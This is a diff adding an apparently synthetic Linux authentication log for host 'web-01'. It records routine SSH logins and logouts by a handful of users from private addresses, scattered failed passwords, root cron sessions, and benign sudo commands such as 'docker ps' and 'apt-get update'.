+Sep 18 14:30:38 web-01 sshd[7229]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 14:32:21 web-01 sshd[8751]: pam_unix(sshd:session): session closed for user admin
+Sep 18 14:33:00 web-01 CRON[9063]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 14:34:04 web-01 sshd[4536]: pam_unix(sshd:session): session closed for user carol
+Sep 18 14:35:34 web-01 sshd[6123]: pam_unix(sshd:session): session closed for user admin
+Sep 18 14:43:34 web-01 sshd[9637]: pam_unix(sshd:session): session closed for user dave
+Sep 18 14:47:17 web-01 sshd[7860]: Failed password for dave from 192.168.1.21 port 49918 ssh2
+Sep 18 14:48:08 web-01 sshd[8187]: Accepted password for dave from 192.168.1.20 port 62133 ssh2
+Sep 18 14:48:09 web-01 sshd[8187]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 14:49:00 web-01 sshd[8111]: pam_unix(sshd:session): session closed for user alice
+Sep 18 14:49:00 web-01 CRON[8055]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 14:49:07 web-01 sshd[1219]: pam_unix(sshd:session): session closed for user carol
+Sep 18 14:49:16 web-01 sshd[5680]: Accepted password for alice from 192.168.1.30 port 43750 ssh2
+Sep 18 14:49:17 web-01 sshd[5680]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 14:51:00 web-01 CRON[2019]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 14:51:15 web-01 sshd[5972]: pam_unix(sshd:session): session closed for user carol
+Sep 18 14:57:00 web-01 CRON[1888]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 14:57:16 web-01 sshd[5680]: pam_unix(sshd:session): session closed for user alice
+Sep 18 14:57:16 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/docker ps
+Sep 18 15:06:37 web-01 sshd[4540]: pam_unix(sshd:session): session closed for user admin
+Sep 18 15:07:20 web-01 sshd[1620]: Failed password for alice from 192.168.1.11 port 53467 ssh2
+Sep 18 15:09:45 web-01 sshd[1930]: pam_unix(sshd:session): session closed for user bob
+Sep 18 15:11:14 web-01 sshd[1511]: Failed password for admin from 192.168.1.10 port 44232 ssh2
+Sep 18 15:14:40 web-01 sshd[8854]: Accepted password for admin from 192.168.1.12 port 64014 ssh2
+Sep 18 15:14:41 web-01 sshd[8854]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 15:15:25 web-01 sshd[5143]: Accepted password for admin from 192.168.1.22 port 45233 ssh2
+Sep 18 15:15:26 web-01 sshd[5143]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 15:16:38 web-01 sshd[1585]: pam_unix(sshd:session): session closed for user admin
+Sep 18 15:17:23 web-01 sshd[6282]: Accepted password for alice from 192.168.1.50 port 40422 ssh2
+Sep 18 15:17:24 web-01 sshd[6282]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 15:23:50 web-01 sshd[9764]: Accepted password for bob from 192.168.1.21 port 50760 ssh2
+Sep 18 15:23:51 web-01 sshd[9764]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 15:28:18 web-01 sshd[3427]: Accepted password for alice from 192.168.1.12 port 55266 ssh2
+Sep 18 15:28:19 web-01 sshd[3427]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 15:30:41 web-01 sshd[3772]: Accepted password for admin from 192.168.1.21 port 59705 ssh2
+Sep 18 15:30:42 web-01 sshd[3772]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 15:32:00 web-01 CRON[1084]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 15:36:24 web-01 sshd[8108]: Accepted password for carol from 192.168.1.50 port 58057 ssh2
+Sep 18 15:36:25 web-01 sshd[8108]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 15:40:25 web-01 sshd[1196]: pam_unix(sshd:session): session closed for user dave
+Sep 18 15:41:00 web-01 CRON[2896]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 15:41:18 web-01 sshd[3427]: pam_unix(sshd:session): session closed for user alice
+Sep 18 15:41:22 web-01 sshd[4648]: Failed password for alice from 192.168.1.30 port 53677 ssh2
+Sep 18 15:41:24 web-01 sshd[8108]: pam_unix(sshd:session): session closed for user carol
+Sep 18 15:46:25 web-01 sshd[5143]: pam_unix(sshd:session): session closed for user admin
+Sep 18 15:49:42 web-01 sshd[2206]: Accepted password for alice from 192.168.1.30 port 59151 ssh2
+Sep 18 15:49:43 web-01 sshd[2206]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 15:50:11 web-01 sshd[6579]: Accepted password for dave from 192.168.1.20 port 48387 ssh2
+Sep 18 15:50:12 web-01 sshd[6579]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 15:50:20 web-01 sshd[6364]: Failed password for alice from 192.168.1.10 port 60598 ssh2
+Sep 18 15:52:37 web-01 sshd[7229]: pam_unix(sshd:session): session closed for user dave
+Sep 18 15:52:40 web-01 sshd[8854]: pam_unix(sshd:session): session closed for user admin
+Sep 18 15:53:43 web-01 sshd[6149]: Accepted password for alice from 192.168.1.50 port 62029 ssh2
+Sep 18 15:53:44 web-01 sshd[6149]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 15:54:26 web-01 sshd[1391]: Accepted password for carol from 192.168.1.22 port 54083 ssh2
+Sep 18 15:54:27 web-01 sshd[1391]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 15:54:31 web-01 sshd[6777]: Accepted password for admin from 192.168.1.50 port 64074 ssh2
+Sep 18 15:54:32 web-01 sshd[6777]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 15:55:34 web-01 sshd[6265]: Accepted password for carol from 192.168.1.11 port 49224 ssh2
+Sep 18 15:55:35 web-01 sshd[6265]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 15:57:22 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 18 15:57:36 web-01 sshd[1750]: pam_unix(sshd:session): session closed for user bob
+Sep 18 16:01:11 web-01 sshd[8457]: Accepted password for alice from 192.168.1.30 port 40804 ssh2
+Sep 18 16:01:12 web-01 sshd[8457]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 16:01:50 web-01 sshd[9764]: pam_unix(sshd:session): session closed for user bob
+Sep 18 16:04:19 web-01 sshd[2412]: Failed password for alice from 192.168.1.30 port 54254 ssh2
+Sep 18 16:04:34 web-01 sshd[6265]: pam_unix(sshd:session): session closed for user carol
+Sep 18 16:05:00 web-01 CRON[7610]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 16:11:01 web-01 sshd[9660]: Accepted password for alice from 192.168.1.22 port 53051 ssh2
+Sep 18 16:11:02 web-01 sshd[9660]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 16:12:38 web-01 sshd[8167]: Accepted password for bob from 192.168.1.50 port 50057 ssh2
+Sep 18 16:12:39 web-01 sshd[8167]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 16:13:53 web-01 sshd[3456]: Accepted password for carol from 192.168.1.10 port 53993 ssh2
+Sep 18 16:13:54 web-01 sshd[3456]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 16:14:08 web-01 sshd[8187]: pam_unix(sshd:session): session closed for user dave
+Sep 18 16:16:42 web-01 sshd[2206]: pam_unix(sshd:session): session closed for user alice
+Sep 18 16:18:01 web-01 sshd[9660]: pam_unix(sshd:session): session closed for user alice
+Sep 18 16:19:00 web-01 CRON[2935]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 16:19:20 web-01 sshd[4687]: Accepted password for dave from 192.168.1.21 port 50003 ssh2
+Sep 18 16:19:21 web-01 sshd[4687]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 16:21:41 web-01 sshd[3772]: pam_unix(sshd:session): session closed for user admin
+Sep 18 16:23:20 web-01 sshd[2221]: Failed password for bob from 192.168.1.12 port 47641 ssh2
+Sep 18 16:23:59 web-01 sshd[7524]: Accepted password for alice from 192.168.1.50 port 49120 ssh2
+Sep 18 16:24:00 web-01 sshd[7524]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 16:25:11 web-01 sshd[1212]: Failed password for carol from 192.168.1.15 port 53962 ssh2
+Sep 18 16:31:29 web-01 sshd[5524]: Failed password for dave from 192.168.1.10 port 61939 ssh2
+Sep 18 16:34:00 web-01 CRON[6695]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 16:35:58 web-01 sshd[1115]: Accepted password for carol from 192.168.1.12 port 53576 ssh2
+Sep 18 16:35:59 web-01 sshd[1115]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 16:40:08 web-01 sshd[7021]: Accepted password for admin from 192.168.1.20 port 41730 ssh2
+Sep 18 16:40:09 web-01 sshd[7021]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 16:42:41 web-01 sshd[2094]: Accepted password for carol from 192.168.1.20 port 63224 ssh2
+Sep 18 16:42:42 web-01 sshd[2094]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 16:50:11 web-01 sshd[6579]: pam_unix(sshd:session): session closed for user dave
+Sep 18 16:52:57 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt-get update
+Sep 18 16:53:06 web-01 sshd[1708]: Accepted password for bob from 192.168.1.31 port 61007 ssh2
+Sep 18 16:53:07 web-01 sshd[1708]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 16:54:24 web-01 sshd[5006]: Accepted password for alice from 192.168.1.10 port 41939 ssh2
+Sep 18 16:54:25 web-01 sshd[5006]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 16:55:43 web-01 sshd[6149]: pam_unix(sshd:session): session closed for user alice
+Sep 18 16:56:23 web-01 sshd[6282]: pam_unix(sshd:session): session closed for user alice
+Sep 18 16:58:39 web-01 sshd[2264]: Accepted password for carol from 192.168.1.30 port 48755 ssh2
+Sep 18 16:58:40 web-01 sshd[2264]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 16:59:26 web-01 sshd[3088]: Failed password for bob from 192.168.1.15 port 51685 ssh2
+Sep 18 17:00:53 web-01 sshd[3456]: pam_unix(sshd:session): session closed for user carol
+Sep 18 17:01:00 web-01 CRON[1537]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 17:01:41 web-01 sshd[2094]: pam_unix(sshd:session): session closed for user carol
+Sep 18 17:08:00 web-01 CRON[4730]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 17:08:31 web-01 sshd[6777]: pam_unix(sshd:session): session closed for user admin
+Sep 18 17:08:58 web-01 sshd[1608]: Accepted password for dave from 192.168.1.12 port 56524 ssh2
+Sep 18 17:08:59 web-01 sshd[1608]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 17:12:00 web-01 CRON[3348]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 17:14:56 web-01 sshd[9863]: Accepted password for dave from 192.168.1.20 port 42810 ssh2
+Sep 18 17:14:57 web-01 sshd[9863]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 17:16:58 web-01 sshd[1115]: pam_unix(sshd:session): session closed for user carol
+Sep 18 17:17:03 web-01 sshd[7129]: Accepted password for alice from 192.168.1.10 port 54288 ssh2
+Sep 18 17:17:04 web-01 sshd[7129]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 17:20:45 web-01 sshd[5710]: Accepted password for alice from 192.168.1.22 port 64283 ssh2
+Sep 18 17:20:46 web-01 sshd[5710]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 17:21:56 web-01 sshd[8833]: Failed password for alice from 192.168.1.12 port 47194 ssh2
+Sep 18 17:25:26 web-01 sshd[1391]: pam_unix(sshd:session): session closed for user carol
+Sep 18 17:28:00 web-01 CRON[8169]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 17:28:55 web-01 sshd[8162]: Accepted password for dave from 192.168.1.11 port 53872 ssh2
+Sep 18 17:28:56 web-01 sshd[8162]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 17:30:01 web-01 sshd[3527]: Accepted password for admin from 192.168.1.21 port 60209 ssh2
+Sep 18 17:30:02 web-01 sshd[3527]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 17:31:09 web-01 sshd[3771]: Accepted password for carol from 192.168.1.20 port 48827 ssh2
+Sep 18 17:31:10 web-01 sshd[3771]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 17:32:00 web-01 CRON[4707]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 17:32:16 web-01 sshd[5625]: Accepted password for admin from 192.168.1.30 port 54367 ssh2
+Sep 18 17:32:17 web-01 sshd[5625]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 17:32:59 web-01 sshd[3714]: Accepted password for admin from 192.168.1.21 port 50904 ssh2
+Sep 18 17:32:59 web-01 sshd[7524]: pam_unix(sshd:session): session closed for user alice
+Sep 18 17:33:00 web-01 sshd[3714]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 17:38:13 web-01 sshd[7518]: Failed password for dave from 192.168.1.30 port 50627 ssh2
+Sep 18 17:41:16 web-01 sshd[7632]: Failed password for admin from 192.168.1.31 port 44682 ssh2
+Sep 18 17:42:45 web-01 sshd[5710]: pam_unix(sshd:session): session closed for user alice
+Sep 18 17:43:35 web-01 sshd[3704]: Failed password for carol from 192.168.1.50 port 54712 ssh2
+Sep 18 17:47:11 web-01 sshd[8457]: pam_unix(sshd:session): session closed for user alice
+Sep 18 17:49:00 web-01 CRON[3656]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 17:50:12 web-01 sshd[5668]: Accepted password for bob from 192.168.1.11 port 46441 ssh2
+Sep 18 17:50:13 web-01 sshd[5668]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 17:50:50 web-01 sshd[7415]: Accepted password for carol from 192.168.1.20 port 62843 ssh2
+Sep 18 17:50:51 web-01 sshd[7415]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 17:52:38 web-01 sshd[8167]: pam_unix(sshd:session): session closed for user bob
+Sep 18 17:55:33 web-01 sshd[4638]: Accepted password for bob from 192.168.1.22 port 59757 ssh2
+Sep 18 17:55:34 web-01 sshd[4638]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 17:58:16 web-01 sshd[5625]: pam_unix(sshd:session): session closed for user admin
+Sep 18 18:01:19 web-01 sshd[3962]: Accepted password for bob from 192.168.1.45 port 57336 ssh2
+Sep 18 18:01:20 web-01 sshd[3962]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 18:03:02 web-01 sshd[7652]: Accepted password for dave from 192.168.1.30 port 62060 ssh2
+Sep 18 18:03:03 web-01 sshd[7652]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 18:04:08 web-01 sshd[7021]: pam_unix(sshd:session): session closed for user admin
+Sep 18 18:04:46 web-01 sshd[8496]: Accepted password for admin from 192.168.1.30 port 64090 ssh2
+Sep 18 18:04:47 web-01 sshd[8496]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 18:06:24 web-01 sshd[5006]: pam_unix(sshd:session): session closed for user alice
+Sep 18 18:07:06 web-01 sshd[1708]: pam_unix(sshd:session): session closed for user bob
+Sep 18 18:07:26 web-01 sshd[1279]: Accepted password for alice from 192.168.1.10 port 44548 ssh2
+Sep 18 18:07:27 web-01 sshd[1279]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 18:08:00 web-01 CRON[9891]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 18:10:00 web-01 CRON[8015]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 18:11:39 web-01 sshd[2264]: pam_unix(sshd:session): session closed for user carol
+Sep 18 18:12:34 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+Sep 18 18:13:05 web-01 sshd[3576]: Failed password for bob from 192.168.1.21 port 41155 ssh2
+Sep 18 18:16:02 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/docker ps
+Sep 18 18:16:20 web-01 sshd[4687]: pam_unix(sshd:session): session closed for user dave
+Sep 18 18:19:50 web-01 sshd[7415]: pam_unix(sshd:session): session closed for user carol
+Sep 18 18:22:09 web-01 sshd[3771]: pam_unix(sshd:session): session closed for user carol
+Sep 18 18:22:55 web-01 sshd[8162]: pam_unix(sshd:session): session closed for user dave
+Sep 18 18:24:59 web-01 sshd[3714]: pam_unix(sshd:session): session closed for user admin
+Sep 18 18:25:58 web-01 sshd[1608]: pam_unix(sshd:session): session closed for user dave
+Sep 18 18:28:00 web-01 CRON[8347]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 18:30:14 web-01 sshd[8760]: Failed password for bob from 192.168.1.20 port 60397 ssh2
+Sep 18 18:32:39 web-01 sshd[8420]: Accepted password for admin from 192.168.1.22 port 63460 ssh2
+Sep 18 18:32:40 web-01 sshd[8420]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 18:34:26 web-01 sshd[2990]: Accepted password for bob from 192.168.1.31 port 61463 ssh2
+Sep 18 18:34:27 web-01 sshd[2990]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 18:35:35 web-01 sshd[7637]: Failed password for dave from 192.168.1.50 port 41609 ssh2
+Sep 18 18:39:03 web-01 sshd[7129]: pam_unix(sshd:session): session closed for user alice
+Sep 18 18:43:56 web-01 sshd[9863]: pam_unix(sshd:session): session closed for user dave
+Sep 18 18:45:02 web-01 sshd[7652]: pam_unix(sshd:session): session closed for user dave
+Sep 18 18:45:05 web-01 sshd[5404]: Accepted password for admin from 192.168.1.45 port 57562 ssh2
+Sep 18 18:45:06 web-01 sshd[5404]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 18:48:00 web-01 CRON[4302]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 18:50:12 web-01 sshd[5668]: pam_unix(sshd:session): session closed for user bob
+Sep 18 18:51:34 web-01 sshd[4403]: Accepted password for dave from 192.168.1.20 port 57202 ssh2
+Sep 18 18:51:35 web-01 sshd[4403]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 18:56:26 web-01 sshd[2990]: pam_unix(sshd:session): session closed for user bob
+Sep 18 18:56:57 web-01 sshd[9285]: Accepted password for bob from 192.168.1.15 port 54285 ssh2
+Sep 18 18:56:58 web-01 sshd[9285]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 18:57:04 web-01 sshd[1750]: Accepted password for alice from 192.168.1.10 port 59146 ssh2
+Sep 18 18:57:05 web-01 sshd[1750]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 19:06:56 web-01 sshd[6337]: Accepted password for dave from 192.168.1.21 port 40809 ssh2
+Sep 18 19:06:57 web-01 sshd[6337]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 19:07:00 web-01 CRON[8295]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 19:07:19 web-01 sshd[5727]: Failed password for alice from 192.168.1.22 port 41187 ssh2
+Sep 18 19:08:53 web-01 sshd[4187]: Accepted password for carol from 192.168.1.22 port 64993 ssh2
+Sep 18 19:08:54 web-01 sshd[4187]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 19:10:28 web-01 sshd[1418]: Failed password for alice from 192.168.1.31 port 43675 ssh2
+Sep 18 19:10:59 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt-get update
+Sep 18 19:11:19 web-01 sshd[3962]: pam_unix(sshd:session): session closed for user bob
+Sep 18 19:12:46 web-01 sshd[6664]: Failed password for dave from 192.168.1.30 port 60766 ssh2
+Sep 18 19:12:58 web-01 sshd[7112]: Failed password for admin from 192.168.1.22 port 45611 ssh2
+Sep 18 19:15:07 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt-get update
+Sep 18 19:18:01 web-01 sshd[3527]: pam_unix(sshd:session): session closed for user admin
+Sep 18 19:18:40 web-01 sshd[3750]: Accepted password for carol from 192.168.1.11 port 60587 ssh2
+Sep 18 19:18:41 web-01 sshd[3750]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 19:19:00 web-01 CRON[9397]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 19:21:10 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+Sep 18 19:23:05 web-01 sshd[5404]: pam_unix(sshd:session): session closed for user admin
+Sep 18 19:28:25 web-01 sshd[4031]: Accepted password for alice from 192.168.1.15 port 63484 ssh2
+Sep 18 19:28:26 web-01 sshd[4031]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 19:34:59 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/docker ps
+Sep 18 19:35:06 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+Sep 18 19:37:26 web-01 sshd[1279]: pam_unix(sshd:session): session closed for user alice
+Sep 18 19:39:46 web-01 sshd[8496]: pam_unix(sshd:session): session closed for user admin
+Sep 18 19:43:35 web-01 sshd[6476]: Failed password for bob from 192.168.1.15 port 51426 ssh2
+Sep 18 19:45:33 web-01 sshd[4638]: pam_unix(sshd:session): session closed for user bob
+Sep 18 19:47:58 web-01 sshd[1204]: Accepted password for admin from 192.168.1.21 port 60014 ssh2
+Sep 18 19:47:59 web-01 sshd[1204]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 19:48:00 web-01 CRON[8081]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 19:50:20 web-01 sshd[6784]: Accepted password for alice from 192.168.1.22 port 60651 ssh2
+Sep 18 19:50:21 web-01 sshd[6784]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 19:50:39 web-01 sshd[8420]: pam_unix(sshd:session): session closed for user admin
+Sep 18 19:52:00 web-01 CRON[3355]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 19:55:40 web-01 sshd[3750]: pam_unix(sshd:session): session closed for user carol
+Sep 18 19:56:34 web-01 sshd[4403]: pam_unix(sshd:session): session closed for user dave
+Sep 18 19:59:42 web-01 sshd[7971]: Accepted password for carol from 192.168.1.11 port 60814 ssh2
+Sep 18 19:59:43 web-01 sshd[7971]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 20:00:00 web-01 CRON[4902]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 20:00:00 web-01 CRON[2088]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 20:06:04 web-01 sshd[1750]: pam_unix(sshd:session): session closed for user alice
+Sep 18 20:06:20 web-01 sshd[6784]: pam_unix(sshd:session): session closed for user alice
+Sep 18 20:13:57 web-01 sshd[9285]: pam_unix(sshd:session): session closed for user bob
+Sep 18 20:30:53 web-01 sshd[4187]: pam_unix(sshd:session): session closed for user carol
+Sep 18 20:32:58 web-01 sshd[1204]: pam_unix(sshd:session): session closed for user admin
+Sep 18 20:48:56 web-01 sshd[6337]: pam_unix(sshd:session): session closed for user dave
+Sep 18 20:53:42 web-01 sshd[7971]: pam_unix(sshd:session): session closed for user carol
+Sep 18 21:17:25 web-01 sshd[4031]: pam_unix(sshd:session): session closed for user alice
